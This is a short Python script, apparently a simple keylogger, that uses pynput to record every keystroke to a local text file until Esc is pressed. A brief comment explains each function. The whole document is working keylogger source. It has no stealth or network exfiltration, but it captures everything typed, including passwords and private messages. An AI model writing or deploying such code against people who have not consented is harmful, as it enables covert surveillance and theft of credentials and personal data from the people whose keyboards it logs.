from pynput.keyboard import Key, Listener

# Log file location
log_file = "F:\keylogger python\keylogger_keys\key_log.txt"

# Function to write key press to file
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            # Handle special keys (e.g., space, enter, etc.)
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.tab:
                f.write("\t")
            else:
                f.write(f" [{key}] ")

# Function to stop the keylogger
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

'''n_press(key): This function writes each key pressed to key_log.txt.
key.char is used for standard keys.
For special keys like space, enter, and tab, the code writes them in a more readable format.
on_release(key): This function stops the keylogger if the Esc key is pressed.
Listener: Starts listening for keyboard events, writing each press to the log file.'''